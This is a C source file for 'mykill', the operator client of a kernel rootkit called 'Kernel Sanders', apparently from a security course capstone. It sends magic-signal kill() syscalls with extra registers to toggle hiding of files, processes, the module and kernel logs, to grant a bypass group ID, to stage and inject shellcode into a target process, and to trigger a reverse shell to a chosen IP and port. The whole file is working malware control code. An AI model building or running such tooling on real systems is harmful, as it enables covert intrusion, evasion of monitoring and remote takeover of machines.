/*
 * mykill.c - Extended C2 binary for the capstone rootkit
 * Build: aarch64-linux-gnu-gcc -static -o mykill mykill.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <arpa/inet.h>

#define MAGIC_SIGNAL    62
#define __NR_kill       129
/* Must match C2_INJECT_STAGING in rootkit.h */
#define STAGING_PATH    "/tmp/secret/rk_sc"

/* ─── Raw syscall with x0-x7 ─────────────────────────────────────────────── */

/*
 * Issue kill(x0=cmd, x1=sig) with extended registers x2-x7.
 * glibc's kill() only sets x0 and x1 — the rest get clobbered by
 * the C calling convention. We use inline asm to set all 8 argument
 * registers and invoke the syscall directly.
 */
static long raw_kill(long x0, long x1, long x2, long x3,
		     long x4, long x5, long x6, long x7)
{
	register long r0 __asm__("x0") = x0;
	register long r1 __asm__("x1") = x1;
	register long r2 __asm__("x2") = x2;
	register long r3 __asm__("x3") = x3;
	register long r4 __asm__("x4") = x4;
	register long r5 __asm__("x5") = x5;
	register long r6 __asm__("x6") = x6;
	register long r7 __asm__("x7") = x7;
	register long r8 __asm__("x8") = __NR_kill;

	__asm__ volatile (
		"svc #0"
		: "+r"(r0)
		: "r"(r1), "r"(r2), "r"(r3), "r"(r4),
		  "r"(r5), "r"(r6), "r"(r7), "r"(r8)
		: "memory", "cc",
		  "x9", "x10", "x11", "x12", "x13", "x14", "x15",
		  "x16", "x17", "x18"
	);

	return r0;
}

/* ─── Stage bulk data to /dev/shm/rk_cmd ─────────────────────────────────── */

static int stage_file(const char *path)
{
	FILE *src, *dst;
	char buf[4096];
	size_t n;

	src = fopen(path, "rb");
	if (!src) {
		perror("fopen (source)");
		return -1;
	}

	dst = fopen(STAGING_PATH, "wb");
	if (!dst) {
		perror("fopen (" STAGING_PATH ")");
		fclose(src);
		return -1;
	}

	while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
		fwrite(buf, 1, n, dst);

	fclose(src);
	fclose(dst);
	return 0;
}

/*
static int stage_string(const char *str)
{
	FILE *f = fopen(STAGING_PATH, "w");
	if (!f) {
		perror("fopen (" STAGING_PATH ")");
		return -1;
	}
	fputs(str, f);
	fclose(f);
	return 0;
}
*/

/* ─── IP string to 32-bit network order ──────────────────────────────────── */

static long ip_to_long(const char *ip_str)
{
	struct in_addr addr;
	if (inet_aton(ip_str, &addr) == 0) {
		fprintf(stderr, "Invalid IP: %s\n", ip_str);
		return -1;
	}
	return (long)addr.s_addr;
}

/* ─── Usage ───────────────────────────────────────────────────────────────── */

static void usage(const char *prog)
{
	fprintf(stderr, "\n");
	fprintf(stderr, "    ███╗   ███╗██╗   ██╗██╗  ██╗██╗██╗     ██╗     \n");
	fprintf(stderr, "    ████╗ ████║╚██╗ ██╔╝██║ ██╔╝██║██║     ██║     \n");
	fprintf(stderr, "    ██╔████╔██║ ╚████╔╝ █████╔╝ ██║██║     ██║     \n");
	fprintf(stderr, "    ██║╚██╔╝██║  ╚██╔╝  ██╔═██╗ ██║██║     ██║     \n");
	fprintf(stderr, "    ██║ ╚═╝ ██║   ██║   ██║  ██╗██║███████╗███████╗\n");
	fprintf(stderr, "    ╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝\n");
	fprintf(stderr, "      -- Kernel Sanders C2 Operator Interface --   \n\n");
	fprintf(stderr, " Usage: ./mykill <cmd> [args]\n\n", prog);
	fprintf(stderr, " [ Stealth & Evasion ]\n");
	fprintf(stderr, "   hide-files            Toggle stealth vault invisibility\n");
	fprintf(stderr, "   block                 Toggle aggressive file access blocking\n");
	fprintf(stderr, "   hide-slinks           Toggle symlink bypass prevention\n");
	fprintf(stderr, "   hide-logs             Toggle kernel dmesg log sanitization\n");
	fprintf(stderr, "   hide-module           Toggle rootkit kernel invisibility (lsmod)\n");
	fprintf(stderr, "   hide-procs            Toggle active process cloaking (ps/top)\n");
	fprintf(stderr, "   add-gid <pid>         Grant MAGIC_GID to target (operator bypass)\n\n");
	fprintf(stderr, " [ Offensive Payloads ]\n");
	fprintf(stderr, "   inject <pid> [bin]    SLAM shellcode natively into active memory\n");
	fprintf(stderr, "   revshell <ip> <port>  Trigger Kernel Sanders interactive callback\n\n");
	fprintf(stderr, " [ Telemetry ]\n");
	fprintf(stderr, "   status                Dump current rootkit subsystem states\n\n");
	fprintf(stderr, "   help                  Show this operator manual\n\n");
	exit(1);
}

int main(int argc, char **argv)
{
	long ret;

	if (argc < 2)
		usage(argv[0]);

	const char *cmd = argv[1];

	if (strcmp(cmd, "help") == 0) {
		usage(argv[0]);
		return 0;

	} else if (strcmp(cmd, "status") == 0) {
		ret = raw_kill(0, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);

	} else if (strcmp(cmd, "hide-files") == 0) {
		ret = raw_kill(1, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);

	} else if (strcmp(cmd, "block") == 0) {
		ret = raw_kill(2, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);

	} else if (strcmp(cmd, "hide-module") == 0) {
		ret = raw_kill(3, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);

	} else if (strcmp(cmd, "hide-procs") == 0) {
		ret = raw_kill(4, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);

	} else if (strcmp(cmd, "add-gid") == 0) {
		if (argc < 3) {
			fprintf(stderr, "Error: add-gid requires a PID\n");
			usage(argv[0]);
		}
		long pid = atol(argv[2]);
		if (pid <= 0) {
			fprintf(stderr, "Error: invalid PID: %s\n", argv[2]);
			return 1;
		}
		ret = raw_kill(5, MAGIC_SIGNAL, pid, 0, 0, 0, 0, 0);
 
	/* For shellcode injection, mykill writes the binary to C2_INJECT_STAGING
 	   (/tmp/secret/rk_sc inside the protected directory, hidden from listings)
 	   then fires CMD_INJECT. The kernel reads and unlinks the file from workqueue
 	   context (process context, safe to sleep).*/
	} else if (strcmp(cmd, "inject") == 0) {
		if (argc < 3) {
			fprintf(stderr, "Error: inject requires a PID\n");
			usage(argv[0]);
		}
		long pid = atol(argv[2]);
		if (pid <= 0) {
			fprintf(stderr, "Error: invalid PID: %s\n", argv[2]);
			return 1;
		}
		/* Optional: stage shellcode binary */
		if (argc >= 4) {
			if (stage_file(argv[3]) < 0)
				return 1;
			printf("[*] Staged %s → %s\n", argv[3], STAGING_PATH);
		}
		ret = raw_kill(6, MAGIC_SIGNAL, pid, 0, 0, 0, 0, 0);

	} else if (strcmp(cmd, "revshell") == 0) {
		if (argc < 4) {
			fprintf(stderr, "Error: revshell requires <ip> <port>\n");
			usage(argv[0]);
		}
		long ip = ip_to_long(argv[2]);
		if (ip < 0)
			return 1;
		long port = atol(argv[3]);
		if (port <= 0 || port > 65535) {
			fprintf(stderr, "Error: invalid port: %s\n", argv[3]);
			return 1;
		}
		ret = raw_kill(7, MAGIC_SIGNAL, port, ip, 0, 0, 0, 0);

	} else if (strcmp(cmd, "hide-slinks") == 0) {
		ret = raw_kill(8, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);

	} else if (strcmp(cmd, "hide-logs") == 0) {
		ret = raw_kill(9, MAGIC_SIGNAL, 0, 0, 0, 0, 0, 0);
		
	} else {
		fprintf(stderr, "Unknown command: %s\n", cmd);
		usage(argv[0]);
		return 1; /* unreachable */
	}

	if (ret < 0) {
		fprintf(stderr, "Error: syscall returned %ld (errno=%d: %s)\n",
			ret, errno, strerror(errno));
		return 1;
	}

	printf("OK: %s\n", cmd);
	return 0;
}
